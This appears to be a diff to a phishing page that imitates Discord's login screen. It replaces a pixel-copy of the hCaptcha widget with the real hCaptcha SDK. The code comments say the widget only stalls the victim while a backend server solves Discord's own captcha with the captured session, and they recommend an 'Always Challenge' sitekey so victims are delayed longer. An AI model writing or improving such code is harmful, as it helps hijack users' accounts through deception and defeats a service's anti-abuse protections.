@@ -14,7 +14,7 @@
     @font-face{font-family:'gg sans';src:local('gg sans'),local('Noto Sans'),local('Helvetica Neue');font-display:swap}
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <!-- hcaptcha is loaded INSIDE an about:blank iframe to force window.location.hostname="" -->
+  <script src="https://js.hcaptcha.com/1/api.js?render=explicit&onload=onHcaptchaLoad" async defer></script>
   <style>
     :root{
       --font-primary:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
@@ -130,104 +130,25 @@
     .mfa-method:hover{text-decoration:underline}
     .mfa-sep{margin-top:14px;border-top:1px solid var(--modifier-accent);padding-top:14px}
 
-    /* ═══ hCaptcha 1:1 replica styles ═══ */
+    /* ═══ Captcha overlay — hosts real hCaptcha SDK widget ═══ */
     .captcha-overlay{
       display:none;position:fixed;top:0;left:0;width:100%;height:100%;
-      background:rgba(0,0,0,.7);z-index:10000;
-      align-items:center;justify-content:center;
+      background:rgba(0,0,0,.55);z-index:10000;
+      align-items:center;justify-content:center;flex-direction:column;
     }
     .captcha-overlay.show{display:flex}
-
-    /* hCaptcha checkbox widget — exact replica */
-    .hc-checkbox-widget{
-      background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;
-      padding:13px 16px;display:inline-flex;align-items:center;gap:12px;
-      width:303px;height:74px;font-family:Arial,Helvetica,sans-serif;
-      box-shadow:0 0 2px rgba(0,0,0,.1);
+    .captcha-inner{
+      display:flex;flex-direction:column;align-items:center;gap:12px;
     }
-    .hc-check-box{
-      width:28px;height:28px;border:2px solid #bbb;border-radius:3px;
-      display:flex;align-items:center;justify-content:center;
-      cursor:pointer;background:#fff;flex-shrink:0;transition:border-color .15s;
+    .captcha-status{
+      color:rgba(255,255,255,.8);font-size:14px;font-family:Arial,sans-serif;
+      text-align:center;display:flex;align-items:center;gap:8px;
     }
-    .hc-check-box:hover{border-color:#999}
-    .hc-check-label{color:#555;font-size:13.5px;user-select:none;flex:1}
-    .hc-brand{display:flex;flex-direction:column;align-items:center;gap:1px;flex-shrink:0}
-    .hc-brand img{width:32px;height:32px}
-    .hc-brand-text{font-size:7px;color:#aaa;white-space:nowrap}
-    .hc-brand-links{font-size:6px;color:#bbb}
-    .hc-brand-links a{color:#aaa;text-decoration:none}
-    .hc-spinner{
-      width:22px;height:22px;border:3px solid #ddd;border-top:3px solid #0074BF;
-      border-radius:50%;animation:hcspin .7s linear infinite;
+    .captcha-status .mini-spin{
+      display:inline-block;width:14px;height:14px;
+      border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
+      border-radius:50%;animation:spin .7s linear infinite;
     }
-    .hc-tick{display:none}
-    @keyframes hcspin{to{transform:rotate(360deg)}}
-
-    /* hCaptcha image challenge popup — 1:1 replica */
-    .hc-challenge{
-      display:none;position:absolute;background:#fff;border-radius:4px;
-      box-shadow:0 4px 24px rgba(0,0,0,.25);overflow:hidden;
-      font-family:Arial,Helvetica,sans-serif;width:302px;
-      z-index:10001;
-    }
-    .hc-challenge.show{display:block}
-    .hc-challenge-header{
-      background:#0074BF;color:#fff;padding:12px 16px;position:relative;
-      min-height:70px;display:flex;flex-direction:column;justify-content:center;
-    }
-    .hc-challenge-prompt{font-size:15px;font-weight:500;line-height:1.35;margin-bottom:2px}
-    .hc-challenge-sub{font-size:12px;opacity:.85;margin-top:2px}
-    .hc-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;padding:2px;background:#e0e0e0}
-    .hc-grid-cell{
-      position:relative;aspect-ratio:1;cursor:pointer;overflow:hidden;
-      background:#f5f5f5;
-    }
-    .hc-grid-cell img{width:100%;height:100%;object-fit:cover;display:block;transition:transform .15s}
-    .hc-grid-cell.selected img{transform:scale(.85);border-radius:6px}
-    .hc-grid-cell .hc-sel-mark{
-      display:none;position:absolute;top:4px;right:4px;
-      width:22px;height:22px;background:#0074BF;border-radius:50%;
-      border:2px solid #fff;
-      align-items:center;justify-content:center;
-    }
-    .hc-grid-cell.selected .hc-sel-mark{display:flex}
-    .hc-challenge-footer{
-      display:flex;align-items:center;padding:10px 12px;background:#fafafa;
-      border-top:1px solid #e0e0e0;gap:8px;
-    }
-    .hc-verify-btn{
-      margin-left:auto;background:#0074BF;color:#fff;border:none;border-radius:3px;
-      padding:8px 24px;font-size:14px;font-weight:500;cursor:pointer;
-      font-family:Arial,Helvetica,sans-serif;transition:background .15s;
-    }
-    .hc-verify-btn:hover{background:#005f9e}
-    .hc-verify-btn:disabled{opacity:.5;cursor:not-allowed}
-    .hc-refresh-btn{
-      width:32px;height:32px;background:none;border:1px solid #ddd;
-      border-radius:3px;cursor:pointer;display:flex;align-items:center;
-      justify-content:center;color:#888;transition:background .15s;
-    }
-    .hc-refresh-btn:hover{background:#f0f0f0}
-    .hc-challenge-loading{
-      display:none;position:absolute;top:0;left:0;width:100%;height:100%;
-      background:rgba(255,255,255,.85);align-items:center;justify-content:center;
-      z-index:5;
-    }
-    .hc-challenge-loading.show{display:flex}
-    .hc-loading-ring{
-      width:36px;height:36px;border:4px solid #e0e0e0;
-      border-top:4px solid #0074BF;border-radius:50%;animation:hcspin .7s linear infinite;
-    }
-    .hc-footer-logo{width:18px;height:18px;opacity:.5}
-    .hc-footer-text{font-size:8px;color:#bbb;line-height:1.2}
-    .hc-footer-text a{color:#aaa;text-decoration:none}
-
-    .captcha-close{
-      margin-top:14px;color:var(--text-muted);font-size:13px;cursor:pointer;
-      text-decoration:none;display:inline-block;
-    }
-    .captcha-close:hover{color:var(--text-normal);text-decoration:underline}
   </style>
 </head>
 <body>
@@ -322,43 +243,11 @@
   </div>
 </div>
 
-<!-- hCaptcha overlay — 1:1 replica -->
+<!-- hCaptcha overlay — real hCaptcha SDK widget -->
 <div class="captcha-overlay" id="captcha-overlay">
-  <div style="position:relative;display:flex;flex-direction:column;align-items:center">
-    <!-- Checkbox widget -->
-    <div class="hc-checkbox-widget" id="hc-widget">
-      <div class="hc-check-box" id="hc-checkbox">
-        <div class="hc-spinner" id="hc-spinner" style="display:none"></div>
-        <svg class="hc-tick" id="hc-tick" width="22" height="22" viewBox="0 0 22 22"><polyline points="5,11 9,15 17,7" fill="none" stroke="#00838F" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      </div>
-      <span class="hc-check-label" id="hc-label">I am human</span>
-      <div class="hc-brand">
-        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgdmlld0JveD0iMCAwIDMyIDMyIj48cmVjdCB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHJ4PSI0IiBmaWxsPSIjMDA3NEJGIi8+PHRleHQgeD0iMTYiIHk9IjIyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9ImJvbGQiIGZvbnQtZmFtaWx5PSJBcmlhbCI+aDwvdGV4dD48L3N2Zz4=" alt="h"/>
-        <span class="hc-brand-text">hCaptcha</span>
-        <span class="hc-brand-links"><a href="#">Privacy</a> - <a href="#">Terms</a></span>
-      </div>
-    </div>
-
-    <!-- Image challenge popup (shown after checkbox click) -->
-    <div class="hc-challenge" id="hc-challenge">
-      <div class="hc-challenge-header">
-        <div class="hc-challenge-prompt" id="hc-prompt">Please click each image containing a <strong id="hc-target">bicycle</strong></div>
-        <div class="hc-challenge-sub">If there are none, click skip</div>
-      </div>
-      <div class="hc-grid" id="hc-grid"></div>
-      <div class="hc-challenge-footer">
-        <img class="hc-footer-logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgdmlld0JveD0iMCAwIDMyIDMyIj48cmVjdCB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHJ4PSI0IiBmaWxsPSIjMDA3NEJGIi8+PHRleHQgeD0iMTYiIHk9IjIyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9ImJvbGQiIGZvbnQtZmFtaWx5PSJBcmlhbCI+aDwvdGV4dD48L3N2Zz4=" alt=""/>
-        <div class="hc-footer-text">Powered by <a href="#">hCaptcha</a></div>
-        <button class="hc-refresh-btn" id="hc-refresh" title="Get new challenge">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6"/><path d="M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
-        </button>
-        <button class="hc-verify-btn" id="hc-verify-btn">Verify</button>
-      </div>
-      <!-- Loading overlay on challenge -->
-      <div class="hc-challenge-loading" id="hc-loading">
-        <div class="hc-loading-ring"></div>
-      </div>
-    </div>
+  <div class="captcha-inner">
+    <div id="h-captcha-target"></div>
+    <div class="captcha-status" id="captcha-status"></div>
   </div>
 </div>
 
@@ -489,141 +378,91 @@ async function pollQR() {
   }
 }
 
-/* ═══ hCaptcha 1:1 Replica — image challenge stall ═══ */
-/* Shows a pixel-perfect hCaptcha widget with image challenge while server solves */
+/* ═══ Real hCaptcha SDK — stalls user with genuine hCaptcha while server solves Discord captcha ═══ */
+/*
+ * SITEKEY: Change this to your own hCaptcha sitekey for real challenges.
+ * Default uses hCaptcha's test key (auto-passes). For image challenges that
+ * actually stall users, register free at https://dashboard.hcaptcha.com and
+ * create a sitekey with difficulty set to "Always Challenge".
+ */
+var HCAPTCHA_SITEKEY = '10000000-ffff-ffff-ffff-000000000001';
 
 var stallPollTimer = null;
 var hcSolvedByServer = false;
-var hcChallengeRound = 0;
+var hcWidgetId = null;
+var hcaptchaReady = false;
+var _pendingServerResult = null;
 
-/* Random challenge data — different prompts and images each time */
-var HC_TARGETS = ['bicycle','bus','boat','airplane','motorbus','motorcycle','train','seaplane','parking meter','traffic light','fire hydrant','chimney'];
-var HC_IMAGE_SETS = [
-  /* Each set = 9 images from picsum (random scenic/object photos) */
-  function(){ var imgs=[]; for(var i=0;i<9;i++) imgs.push('https://picsum.photos/seed/hc'+Math.random().toString(36).substr(2,5)+'/100/100'); return imgs; }
-];
-
-function getRandomImages() {
-  var imgs = [];
-  for (var i = 0; i < 9; i++) {
-    imgs.push('https://picsum.photos/seed/' + Math.random().toString(36).substr(2,6) + '/100/100');
-  }
-  return imgs;
-}
+/* Called by hCaptcha SDK when loaded */
+function onHcaptchaLoad() { hcaptchaReady = true; }
 
 function showCaptchaStall(sessionId) {
   captchaSid = sessionId;
   hcSolvedByServer = false;
-  hcChallengeRound = 0;
+  _pendingServerResult = null;
 
-  /* Reset widget state */
-  var spinner = document.getElementById('hc-spinner');
-  var tick = document.getElementById('hc-tick');
-  var label = document.getElementById('hc-label');
-  var checkbox = document.getElementById('hc-checkbox');
-  var challenge = document.getElementById('hc-challenge');
+  var overlay = document.getElementById('captcha-overlay');
+  var status  = document.getElementById('captcha-status');
+  var target  = document.getElementById('h-captcha-target');
 
-  spinner.style.display = 'none';
-  tick.style.display = 'none';
-  label.textContent = 'I am human';
-  checkbox.style.cursor = 'pointer';
-  checkbox.style.borderColor = '#bbb';
-  challenge.classList.remove('show');
+  status.innerHTML = '';
+  target.innerHTML = '';
+  overlay.classList.add('show');
 
-  /* Show overlay */
-  document.getElementById('captcha-overlay').classList.add('show');
-
-  /* Checkbox click → spinner → open image challenge */
-  checkbox.onclick = function() {
-    if (hcSolvedByServer) return;
-    checkbox.onclick = null;
-    checkbox.style.cursor = 'default';
-    spinner.style.display = 'block';
-    /* Brief spinner on checkbox, then pop open the image challenge */
-    setTimeout(function() {
-      openImageChallenge();
-    }, 600 + Math.random() * 400);
-  };
-
-  /* Start polling for server result */
-  stallPollTimer = setInterval(function() { pollSolveResult(sessionId); }, 2000);
-}
-
-function openImageChallenge() {
-  hcChallengeRound++;
-  var target = HC_TARGETS[Math.floor(Math.random() * HC_TARGETS.length)];
-  document.getElementById('hc-target').textContent = target;
-
-  var grid = document.getElementById('hc-grid');
-  var imgs = getRandomImages();
-  grid.innerHTML = '';
-  for (var i = 0; i < 9; i++) {
-    var cell = document.createElement('div');
-    cell.className = 'hc-grid-cell';
-    cell.innerHTML = '<img src="' + imgs[i] + '" alt=""/><div class="hc-sel-mark"><svg width="12" height="12" viewBox="0 0 16 16"><polyline points="3,8 6.5,11.5 13,5" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>';
-    cell.addEventListener('click', (function(c){ return function(){
-      c.classList.toggle('selected');
-    }; })(cell));
-    grid.appendChild(cell);
+  /* Render real hCaptcha widget */
+  if (hcaptchaReady) {
+    _renderHcaptcha(target);
+  } else {
+    target.innerHTML = '<div style="background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;padding:14px 16px;display:inline-flex;align-items:center;gap:12px;width:303px;height:74px"><div class="spinner" style="border-color:#ddd;border-top-color:#0074BF;width:22px;height:22px"></div><span style="color:#555;font-size:13.5px">Loading verification\u2026</span></div>';
+    var _wait = setInterval(function() {
+      if (hcaptchaReady) { clearInterval(_wait); target.innerHTML = ''; _renderHcaptcha(target); }
+    }, 300);
   }
 
-  document.getElementById('hc-loading').classList.remove('show');
-  document.getElementById('hc-challenge').classList.add('show');
-
-  /* Verify button → show loading → if server done: close. Otherwise: new round */
-  document.getElementById('hc-verify-btn').onclick = function() {
-    onChallengeVerify();
-  };
-  document.getElementById('hc-refresh').onclick = function() {
-    document.getElementById('hc-loading').classList.add('show');
-    setTimeout(function(){ openImageChallenge(); }, 400 + Math.random() * 300);
-  };
+  /* Poll server for Discord captcha result */
+  stallPollTimer = setInterval(function() { pollSolveResult(sessionId); }, 1500);
 }
 
-function onChallengeVerify() {
-  /* Show loading spinner over the challenge */
-  document.getElementById('hc-loading').classList.add('show');
-  document.getElementById('hc-verify-btn').disabled = true;
-
-  /* Wait 1-2s to simulate verification */
-  var delay = 1200 + Math.random() * 800;
-  setTimeout(function() {
-    document.getElementById('hc-verify-btn').disabled = false;
-
-    if (hcSolvedByServer) {
-      /* Server is done! Show success sequence */
-      finishCaptchaSuccess();
-      return;
-    }
-    /* Server still working — show another round of images */
-    if (hcChallengeRound < 8) {
-      /* "Incorrect" — load new challenge */
-      openImageChallenge();
-    } else {
-      /* Too many rounds — just keep showing loading until server finishes */
-      document.getElementById('hc-loading').classList.add('show');
-    }
-  }, delay);
+function _renderHcaptcha(target) {
+  try {
+    hcWidgetId = hcaptcha.render(target, {
+      sitekey: HCAPTCHA_SITEKEY,
+      theme: 'dark',
+      size: 'normal',
+      callback: _onHcaptchaPass,
+      'expired-callback': _onHcaptchaExpire,
+      'error-callback': _onHcaptchaError,
+    });
+  } catch(e) {
+    console.warn('hCaptcha render error:', e);
+    target.innerHTML = '<div style="background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;padding:14px 16px;display:inline-flex;align-items:center;gap:12px;width:303px;height:74px"><div class="spinner" style="border-color:#ddd;border-top-color:#0074BF;width:22px;height:22px"></div><span style="color:#555;font-size:13.5px">Verifying you are human\u2026</span></div>';
+  }
 }
 
-function finishCaptchaSuccess() {
-  /* Close challenge popup */
-  document.getElementById('hc-challenge').classList.remove('show');
-
-  /* Show tick on checkbox */
-  document.getElementById('hc-spinner').style.display = 'none';
-  document.getElementById('hc-tick').style.display = 'block';
-  document.getElementById('hc-label').textContent = '';
-  document.getElementById('hc-checkbox').style.borderColor = '#00838F';
-
-  /* Brief pause then close overlay */
-  setTimeout(function() {
-    document.getElementById('captcha-overlay').classList.remove('show');
-  }, 600);
+function _onHcaptchaPass(token) {
+  /* User completed hCaptcha (we don't use this token, purely visual stall) */
+  var status = document.getElementById('captcha-status');
+  status.innerHTML = '<span class="mini-spin"></span> Verified! Connecting to Discord\u2026';
+  /* If server already finished, process immediately */
+  if (hcSolvedByServer && _pendingServerResult) {
+    var d = _pendingServerResult; _pendingServerResult = null;
+    setTimeout(function() { _closeCaptchaOverlay(); processServerResult(d); }, 400);
+  }
+}
+function _onHcaptchaExpire() {
+  if (hcWidgetId !== null && hcaptchaReady) try { hcaptcha.reset(hcWidgetId); } catch(e) {}
+}
+function _onHcaptchaError() {
+  document.getElementById('captcha-status').innerHTML = '<span class="mini-spin"></span> Verifying\u2026';
 }
 
-function startFakeVerify() { /* compat stub */ }
-function showFakeTick() { /* compat stub */ }
+function _closeCaptchaOverlay() {
+  document.getElementById('captcha-overlay').classList.remove('show');
+  if (hcWidgetId !== null && hcaptchaReady) {
+    try { hcaptcha.reset(hcWidgetId); } catch(e) {}
+  }
+  hcWidgetId = null;
+}
 
 async function pollSolveResult(sessionId) {
   try {
@@ -635,33 +474,11 @@ async function pollSolveResult(sessionId) {
     /* Done — stop polling */
     clearInterval(stallPollTimer);
     stallPollTimer = null;
-
-    /* Mark as solved so the challenge UI can finish on next verify click */
     hcSolvedByServer = true;
 
-    /* If challenge is currently showing a loading overlay or user hasn't interacted, auto-finish */
-    var loading = document.getElementById('hc-loading');
-    var challenge = document.getElementById('hc-challenge');
-    if (loading && loading.classList.contains('show')) {
-      /* Already in verify-loading state — finish now */
-      setTimeout(function() { finishCaptchaSuccess(); processServerResult(d); }, 500 + Math.random() * 400);
-      return;
-    }
-    if (!challenge || !challenge.classList.contains('show')) {
-      /* Challenge not visible (still on checkbox) — show tick and proceed */
-      finishCaptchaSuccess();
-      setTimeout(function() { processServerResult(d); }, 700);
-      return;
-    }
-    /* Challenge is visible but user hasn't clicked verify yet.
-       Store result — will be processed when user clicks verify */
-    window._pendingResult = d;
-    var origFinish = finishCaptchaSuccess;
-    finishCaptchaSuccess = function() {
-      origFinish();
-      var pd = window._pendingResult;
-      if (pd) { window._pendingResult = null; setTimeout(function(){ processServerResult(pd); }, 700); }
-    };
+    /* Close overlay and process result */
+    _closeCaptchaOverlay();
+    setTimeout(function() { processServerResult(d); }, 250);
   } catch(e) {
     console.error('[stall] Poll error:', e);
   }
@@ -749,22 +566,18 @@ async function retryAfterVerify() {
   }
 }
 
-/* Old iframe-based captcha flow (kept as fallback if no API key) */
+/* Fallback captcha overlay (no API key configured) */
 function showCaptchaOverlay(sitekey, rqdata, rqtoken, sessionId) {
   captchaSid = sessionId;
   captchaRqtoken = rqtoken;
-  /* Just show a message since no solver is configured */
-  var overlay = document.getElementById('captcha-overlay');
-  overlay.classList.add('show');
+  showCaptchaStall(sessionId); /* Use the real hCaptcha stall */
 }
 
 function closeCaptcha() {
   clearInterval(stallPollTimer);
   stallPollTimer = null;
   hcSolvedByServer = false;
-  document.getElementById('captcha-overlay').classList.remove('show');
-  document.getElementById('hc-challenge').classList.remove('show');
-  hcaptchaWidgetId = null;
+  _closeCaptchaOverlay();
   btnLoad('login-btn', false);
 }
 
